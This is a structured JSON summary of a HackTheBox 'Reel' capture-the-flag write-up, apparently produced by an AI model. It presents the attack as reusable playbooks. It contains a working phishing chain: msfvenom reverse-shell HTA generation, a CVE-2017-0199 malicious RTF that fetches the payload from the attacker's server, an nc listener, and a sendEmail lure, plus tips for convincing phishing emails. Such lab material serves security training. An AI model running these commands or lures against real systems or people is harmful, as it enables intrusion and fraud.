@@ -1,0 +1,892 @@
+{
+  "writeup_id": "Htb_Reel",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_phishing_rtf_exploitation",
+    "primary_services": [
+      "ftp",
+      "smtp",
+      "ssh"
+    ],
+    "port_signature": "21+22+25",
+    "service_combination": "ftp+smtp+ssh",
+    "os_family": "windows_server",
+    "environment_type": "corporate_email_server",
+    "entry_vector": "phishing_rtf_exploit",
+    "privilege_path": "phishing_to_ad_escalation",
+    "attack_complexity": "hard",
+    "estimated_time": "3-4 hours",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "anonymous_ftp_with_documents",
+      "rtf_document_processing",
+      "applocker_restrictions",
+      "email_metadata_disclosure"
+    ],
+    "environmental_clues": [
+      "microsoft_ftp_service",
+      "document_conversion_workflow",
+      "corporate_email_addresses",
+      "security_policy_documents"
+    ],
+    "similar_scenarios": [
+      "apt_htb_hard",
+      "blackfield_htb_hard"
+    ],
+    "unique_aspects": [
+      "rtf_format_requirement",
+      "document_review_process",
+      "applocker_bypass_needed",
+      "email_based_initial_access"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "FTP_Anonymous_Access",
+        "success_reason": "Anonymous FTP login allowed with sensitive documents exposed",
+        "prerequisite_indicators": [
+          "ftp_service_available",
+          "anonymous_login_enabled",
+          "documents_directory_accessible"
+        ],
+        "recognition_patterns": [
+          "nmap shows 'Anonymous FTP login allowed'",
+          "documents directory contains office files",
+          "metadata extraction reveals email addresses"
+        ],
+        "failure_modes": [
+          "anonymous_access_disabled",
+          "empty_ftp_directories",
+          "no_sensitive_documents"
+        ],
+        "environmental_factors": [
+          "default_ftp_configuration",
+          "poor_file_management_practices",
+          "insufficient_access_controls"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "SMTP_User_Enumeration",
+        "success_reason": "SMTP server accepts RCPT TO commands for user validation",
+        "prerequisite_indicators": [
+          "smtp_service_available",
+          "rcpt_to_enumeration_possible",
+          "domain_names_known"
+        ],
+        "recognition_patterns": [
+          "250 OK responses for valid users",
+          "550 Unknown user for invalid users",
+          "different responses for different domains"
+        ],
+        "failure_modes": [
+          "smtp_enumeration_disabled",
+          "uniform_responses_regardless_of_user",
+          "rate_limiting_implemented"
+        ],
+        "environmental_factors": [
+          "legacy_smtp_configuration",
+          "insufficient_smtp_hardening",
+          "multiple_domain_handling"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "5-10 minutes"
+      },
+      {
+        "technique": "Phishing_RTF_Exploit",
+        "success_reason": "Target processes RTF attachments automatically and readme.txt indicated RTF preference",
+        "prerequisite_indicators": [
+          "email_addresses_discovered",
+          "document_processing_confirmed",
+          "rtf_format_preference_stated"
+        ],
+        "recognition_patterns": [
+          "readme.txt mentions RTF format",
+          "automated document processing hints",
+          "valid email addresses from metadata"
+        ],
+        "failure_modes": [
+          "email_filtering_blocks_attachments",
+          "rtf_exploits_patched",
+          "no_automated_processing"
+        ],
+        "environmental_factors": [
+          "legacy_office_versions",
+          "insufficient_email_security",
+          "automated_document_workflows"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "15-30 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "nico@megabank.com email address",
+        "discovery_method": "exiftool metadata extraction from Windows Event Forwarding.docx",
+        "why_critical": "Provided valid target for phishing attack",
+        "how_to_recognize": [
+          "office document metadata contains creator info",
+          "email format matches organizational pattern",
+          "smtp enumeration confirms validity"
+        ],
+        "follow_up_actions": [
+          "verify_email_via_smtp_enumeration",
+          "craft_malicious_rtf_document",
+          "prepare_phishing_email"
+        ]
+      },
+      {
+        "discovery": "RTF document processing preference",
+        "discovery_method": "readme.txt content analysis",
+        "why_critical": "Indicated automated processing of RTF attachments",
+        "how_to_recognize": [
+          "explicit mention of RTF format preference",
+          "automated review and conversion process",
+          "document workflow descriptions"
+        ],
+        "follow_up_actions": [
+          "research_rtf_exploits",
+          "craft_malicious_rtf_payload",
+          "test_exploit_compatibility"
+        ]
+      },
+      {
+        "discovery": "AppLocker restrictions",
+        "discovery_method": "AppLocker.docx content analysis",
+        "why_critical": "Revealed execution restrictions requiring bypass techniques",
+        "how_to_recognize": [
+          "explicit mention of hash rules",
+          "file extension restrictions listed",
+          "security policy documentation"
+        ],
+        "follow_up_actions": [
+          "plan_applocker_bypass_techniques",
+          "use_whitelisted_binaries",
+          "consider_powershell_alternatives"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "initial_access",
+        "escalation_method": "phishing_to_user_context",
+        "why_possible": "Automated RTF processing with vulnerable office version",
+        "recognition_signs": [
+          "rtf_format_preference_documented",
+          "valid_email_addresses_discovered",
+          "smtp_enumeration_successful"
+        ],
+        "exploitation_path": "FTP enumeration → Email discovery → RTF exploit → User shell"
+      },
+      {
+        "privilege_level": "user_context",
+        "escalation_method": "active_directory_enumeration",
+        "why_possible": "Windows domain environment with potential AD misconfigurations",
+        "recognition_signs": [
+          "windows_domain_environment",
+          "service_accounts_likely_present",
+          "exchange_server_indicators"
+        ],
+        "exploitation_path": "User shell → AD enumeration → Privilege escalation → Domain admin"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 21,22,25 open on Windows host",
+        "decision": "Enumerate FTP for intelligence gathering and SMTP for user enumeration",
+        "reasoning": "Limited attack surface requires thorough enumeration of available services",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "smtp_user_enumeration",
+            "when": "if ftp fails"
+          },
+          {
+            "option": "ssh_enumeration",
+            "when": "if credentials found"
+          }
+        ],
+        "success_indicators": [
+          "ftp_anonymous_access",
+          "documents_found",
+          "email_addresses_discovered"
+        ],
+        "next_decision": "analyze_documents_for_attack_vectors"
+      },
+      {
+        "step": 2,
+        "situation": "Found documents mentioning RTF format and email address in metadata",
+        "decision": "Craft phishing attack using RTF exploit targeting discovered email",
+        "reasoning": "readme.txt specifically mentions RTF format review process, indicating document processing workflow",
+        "confidence": 0.85,
+        "prerequisites": [
+          "valid_email_address",
+          "rtf_exploit_available",
+          "smtp_access"
+        ],
+        "success_indicators": [
+          "http_request_to_hta_payload",
+          "reverse_shell_connection"
+        ],
+        "failure_fallbacks": [
+          "alternative_document_formats",
+          "direct_smtp_exploitation"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Gained initial shell access through phishing",
+        "decision": "Enumerate Active Directory environment and user privileges",
+        "reasoning": "Windows domain environment likely present based on email domain structure",
+        "confidence": 0.8,
+        "prerequisites": [
+          "shell_access_obtained"
+        ],
+        "success_indicators": [
+          "domain_membership_confirmed",
+          "user_groups_identified"
+        ],
+        "next_decision": "identify_privilege_escalation_paths"
+      }
+    ],
+    "branching_logic": {
+      "if_ftp_anonymous_succeeds": {
+        "action": "download_all_documents_and_analyze_metadata",
+        "tools": [
+          "exiftool",
+          "document_analysis"
+        ],
+        "next_phase": "extract_intelligence_for_targeting"
+      },
+      "if_documents_contain_emails": {
+        "action": "validate_emails_via_smtp_enumeration",
+        "tools": [
+          "smtp-user-enum",
+          "manual_telnet_testing"
+        ],
+        "decision_criteria": "confirmed_valid_recipients"
+      },
+      "if_rtf_processing_mentioned": {
+        "action": "craft_cve_2017_0199_exploit",
+        "tools": [
+          "msfvenom",
+          "metasploit",
+          "custom_hta_payload"
+        ],
+        "delivery_method": "phishing_email"
+      },
+      "if_shell_obtained": {
+        "action": "enumerate_domain_environment",
+        "purpose": "identify_privilege_escalation_opportunities",
+        "tools": [
+          "whoami",
+          "net_commands",
+          "bloodhound"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_document_metadata_for_intelligence",
+        "reasoning": "metadata_often_contains_usernames_and_organizational_info",
+        "applicability": "any_document_discovery"
+      },
+      {
+        "rule": "validate_smtp_users_before_phishing_attempts",
+        "reasoning": "reduces_detection_risk_and_improves_success_rate",
+        "applicability": "phishing_attack_scenarios"
+      },
+      {
+        "rule": "leverage_business_processes_mentioned_in_documents",
+        "reasoning": "social_engineering_more_effective_with_legitimate_workflows",
+        "applicability": "phishing_and_social_engineering"
+      },
+      {
+        "rule": "use_rtf_exploits_when_document_processing_confirmed",
+        "reasoning": "high_success_rate_against_office_environments",
+        "applicability": "windows_office_environments"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Phishing with Malicious RTF",
+        "mitre_id": "T1566.001",
+        "required_services": [
+          "smtp",
+          "ftp"
+        ],
+        "required_ports": [
+          25,
+          21
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "smtp_service_accessible",
+          "email_addresses_discovered",
+          "document_processing_workflow_exists",
+          "file_upload_capability"
+        ],
+        "success_indicators": [
+          "smtp_accepts_external_mail",
+          "target_email_addresses_found",
+          "document_metadata_reveals_users",
+          "automated_document_processing_hints"
+        ],
+        "incompatible_with": [
+          "smtp_auth_required",
+          "email_filtering_blocks_attachments",
+          "no_document_workflow"
+        ],
+        "confidence_boosters": [
+          "readme_mentions_rtf_review_process",
+          "ftp_contains_sample_documents",
+          "email_metadata_in_documents"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "30-60 minutes"
+      },
+      {
+        "technique": "Anonymous FTP Enumeration",
+        "mitre_id": "T1083",
+        "required_services": [
+          "ftp"
+        ],
+        "required_ports": [
+          21
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "ftp_service_running",
+          "anonymous_login_enabled"
+        ],
+        "success_indicators": [
+          "ftp_banner_shows_microsoft_ftpd",
+          "anonymous_login_accepted",
+          "readable_directories_present"
+        ],
+        "incompatible_with": [
+          "ftp_requires_authentication",
+          "empty_ftp_directories",
+          "ftp_service_disabled"
+        ],
+        "confidence_boosters": [
+          "documents_directory_present",
+          "recent_file_timestamps",
+          "business_documents_available"
+        ],
+        "typical_success_rate": 0.9,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "SMTP User Enumeration",
+        "mitre_id": "T1087.003",
+        "required_services": [
+          "smtp"
+        ],
+        "required_ports": [
+          25
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "smtp_service_accessible",
+          "vrfy_command_enabled"
+        ],
+        "success_indicators": [
+          "smtp_banner_responsive",
+          "vrfy_command_in_help",
+          "accepts_external_connections"
+        ],
+        "incompatible_with": [
+          "smtp_auth_required_for_commands",
+          "vrfy_command_disabled",
+          "connection_filtering_active"
+        ],
+        "confidence_boosters": [
+          "help_command_shows_vrfy",
+          "no_authentication_required",
+          "standard_smtp_responses"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "10-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "windows_server": {
+        "port_indicators": [
+          21,
+          25,
+          135,
+          139,
+          445
+        ],
+        "service_indicators": [
+          "microsoft_ftpd",
+          "smtp",
+          "smb"
+        ],
+        "banner_indicators": [
+          "Microsoft FTP Service",
+          "Windows_NT"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "email_server": {
+        "port_indicators": [
+          25,
+          587,
+          993,
+          995
+        ],
+        "service_indicators": [
+          "smtp",
+          "smtps"
+        ],
+        "banner_indicators": [
+          "Mail Service ready",
+          "SMTP"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "document_workflow": {
+        "port_indicators": [
+          21,
+          80,
+          443
+        ],
+        "service_indicators": [
+          "ftp",
+          "http",
+          "https"
+        ],
+        "file_indicators": [
+          ".docx",
+          ".rtf",
+          ".pdf",
+          "readme.txt"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "anonymous_ftp_enumeration",
+          "when": "ftp_anonymous_login_detected",
+          "reason": "immediate_access_to_intelligence_gathering"
+        },
+        {
+          "attack": "malicious_rtf_phishing",
+          "when": "email_addresses_and_document_workflow_detected",
+          "reason": "high_success_rate_with_social_engineering"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "smtp_user_enumeration",
+          "when": "smtp_service_detected",
+          "reason": "useful_for_username_discovery"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "CVE-2017-0199 RTF Exploit",
+        "mitre_id": "T1566.001",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "msfvenom",
+            "command_template": "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f hta-psh -o {output}",
+            "actual_command": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f hta-psh -o msfv.hta",
+            "output_pattern": "Payload size: 324 bytes",
+            "effectiveness_rating": 5,
+            "reliability": 0.92
+          },
+          {
+            "name": "CVE-2017-0199 toolkit",
+            "command_template": "python cve-2017-0199_toolkit.py -M gen -w {output} -u http://{ip}/{hta} -t rtf -x 0",
+            "actual_command": "python CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.3/msfv.hta -t rtf -x 0",
+            "success_factors": [
+              "vulnerable_office_version",
+              "user_opens_document"
+            ],
+            "effectiveness_rating": 5
+          },
+          {
+            "name": "sendEmail",
+            "command_template": "sendEmail -f {from} -t {to} -u {subject} -m {body} -a {attachment} -s {smtp_server} -v",
+            "actual_command": "sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u \"Invoice Attached\" -m \"You are overdue payment\" -a invoice.rtf -s 10.10.10.77 -v",
+            "success_factors": [
+              "valid_email_address",
+              "smtp_accepts_external_mail"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "vulnerable_office_version",
+          "smtp_server_accessible",
+          "valid_target_email_address",
+          "user_opens_attachments"
+        ],
+        "success_indicators": [
+          "email_sent_successfully",
+          "http_request_for_hta_file",
+          "reverse_shell_connection",
+          "code_execution_as_user"
+        ],
+        "common_failures": [
+          "patched_office_version",
+          "email_blocked_by_filters",
+          "user_doesnt_open_attachment",
+          "antivirus_detection"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "credential_harvesting",
+          "lateral_movement"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "SMTP User Enumeration",
+        "mitre_id": "T1589.003",
+        "category": "reconnaissance",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "smtp-user-enum",
+            "command_template": "smtp-user-enum -M {method} -U {userlist} -t {target}",
+            "actual_command": "smtp-user-enum -M RCPT -U test-users.txt -t 10.10.10.77",
+            "output_pattern": "exists",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "telnet",
+            "command_template": "telnet {target} 25",
+            "actual_command": "telnet 10.10.10.77 25",
+            "success_factors": [
+              "smtp_allows_enumeration",
+              "no_rate_limiting"
+            ],
+            "effectiveness_rating": 3
+          }
+        ],
+        "prerequisites": [
+          "smtp_service_accessible",
+          "smtp_allows_rcpt_enumeration"
+        ],
+        "success_indicators": [
+          "valid_users_identified",
+          "domain_information_gathered",
+          "email_addresses_confirmed"
+        ],
+        "common_failures": [
+          "smtp_blocks_enumeration",
+          "rate_limiting_active",
+          "false_positives_in_results"
+        ],
+        "follow_up_techniques": [
+          "phishing_attacks",
+          "credential_spraying",
+          "social_engineering"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "FTP Anonymous Access",
+        "mitre_id": "T1078.001",
+        "category": "initial_access",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "ftp",
+            "command_template": "ftp {target}",
+            "actual_command": "ftp 10.10.10.77",
+            "output_pattern": "230 User logged in",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "exiftool",
+            "command_template": "exiftool {file}",
+            "actual_command": "exiftool Windows\\ Event\\ Forwarding.docx",
+            "success_factors": [
+              "documents_contain_metadata",
+              "creator_information_present"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "ftp_service_accessible",
+          "anonymous_login_enabled"
+        ],
+        "success_indicators": [
+          "successful_anonymous_login",
+          "files_downloaded",
+          "metadata_extracted",
+          "email_addresses_found"
+        ],
+        "common_failures": [
+          "anonymous_access_disabled",
+          "empty_directories",
+          "no_useful_metadata"
+        ],
+        "follow_up_techniques": [
+          "metadata_analysis",
+          "phishing_preparation",
+          "intelligence_gathering"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "CVE-2017-0199 toolkit",
+        "use_case": "rtf_exploit_generation",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "office_exploitation"
+        ],
+        "alternatives": [
+          "metasploit_rtf_modules",
+          "manual_rtf_crafting"
+        ],
+        "best_practices": [
+          "disable_obfuscation_for_reliability",
+          "use_common_document_names",
+          "host_hta_on_reliable_server"
+        ]
+      },
+      {
+        "tool": "sendEmail",
+        "use_case": "phishing_email_delivery",
+        "effectiveness_rating": 4,
+        "reliability": 0.88,
+        "learning_curve": "low",
+        "essential_for": [
+          "phishing_campaigns"
+        ],
+        "alternatives": [
+          "swaks",
+          "manual_telnet_smtp"
+        ],
+        "best_practices": [
+          "use_convincing_from_addresses",
+          "craft_believable_subjects",
+          "verify_smtp_accepts_external_mail"
+        ]
+      },
+      {
+        "tool": "exiftool",
+        "use_case": "document_metadata_extraction",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "intelligence_gathering"
+        ],
+        "alternatives": [
+          "strings",
+          "file_properties"
+        ],
+        "best_practices": [
+          "check_all_document_types",
+          "focus_on_creator_fields",
+          "extract_email_addresses"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "rtf_phishing_attack",
+        "steps": [
+          {
+            "step": 1,
+            "command": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f hta-psh -o msfv.hta",
+            "purpose": "Generate malicious HTA payload",
+            "expected_output": "Payload size: 324 bytes"
+          },
+          {
+            "step": 2,
+            "command": "python CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.3/msfv.hta -t rtf -x 0",
+            "purpose": "Create malicious RTF document",
+            "expected_output": "Generated invoice.rtf successfully"
+          },
+          {
+            "step": 3,
+            "command": "python -m http.server 80",
+            "purpose": "Host HTA file for download",
+            "expected_output": "HTTP server running"
+          },
+          {
+            "step": 4,
+            "command": "nc -lnvp 443",
+            "purpose": "Listen for reverse shell",
+            "expected_output": "Listening on port 443"
+          },
+          {
+            "step": 5,
+            "command": "sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u \"Invoice Attached\" -m \"You are overdue payment\" -a invoice.rtf -s 10.10.10.77 -v",
+            "purpose": "Send phishing email with malicious attachment",
+            "expected_output": "Email was sent successfully"
+          }
+        ],
+        "success_rate": 0.78,
+        "typical_duration": "20-45 minutes"
+      },
+      {
+        "sequence_name": "ftp_intelligence_gathering",
+        "steps": [
+          {
+            "step": 1,
+            "command": "ftp 10.10.10.77",
+            "purpose": "Connect to FTP server",
+            "expected_output": "Connected to 10.10.10.77"
+          },
+          {
+            "step": 2,
+            "command": "anonymous",
+            "purpose": "Login as anonymous user",
+            "expected_output": "230 User logged in"
+          },
+          {
+            "step": 3,
+            "command": "mget *",
+            "purpose": "Download all available files",
+            "expected_output": "Files downloaded successfully"
+          },
+          {
+            "step": 4,
+            "command": "exiftool *.docx",
+            "purpose": "Extract metadata from documents",
+            "expected_output": "Creator: nico@megabank.com"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "10-15 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Reel",
+      "difficulty": "Hard",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2018-06-23",
+      "author": "egre55",
+      "estimated_time": "4-6 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "high",
+      "skill_level_required": "advanced",
+      "primary_attack_vectors": [
+        "phishing",
+        "active_directory",
+        "document_exploitation"
+      ],
+      "key_vulnerabilities": [
+        "rtf_exploitation",
+        "ad_privilege_escalation",
+        "excessive_permissions"
+      ],
+      "environment_type": "corporate_active_directory",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "phishing_techniques",
+        "rtf_exploitation",
+        "ad_lateral_movement",
+        "acl_manipulation"
+      ],
+      "prerequisite_knowledge": [
+        "advanced_ad_concepts",
+        "document_exploitation",
+        "phishing_methodology",
+        "acl_permissions"
+      ]
+    },
+    "categorization": {
+      "primary_category": "active_directory",
+      "subcategories": [
+        "phishing",
+        "document_exploitation",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation",
+        "lateral_movement"
+      ],
+      "defensive_lessons": [
+        "email_security",
+        "document_sandboxing",
+        "acl_hardening",
+        "user_awareness_training"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Blackfield",
+        "Monteverde",
+        "Cascade"
+      ],
+      "similarity_reasons": [
+        "ad_environment",
+        "multi_stage_privilege_escalation",
+        "acl_exploitation"
+      ],
+      "unique_aspects": [
+        "phishing_attack_vector",
+        "rtf_document_exploitation",
+        "email_based_initial_access"
+      ],
+      "difficulty_factors": [
+        "complex_attack_chain",
+        "phishing_crafting",
+        "ad_acl_understanding",
+        "multi_user_pivoting"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T20:35:16.758328",
+    "original_file": "0xdf_writeups/Htb Reel.md",
+    "content_length": 39169,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
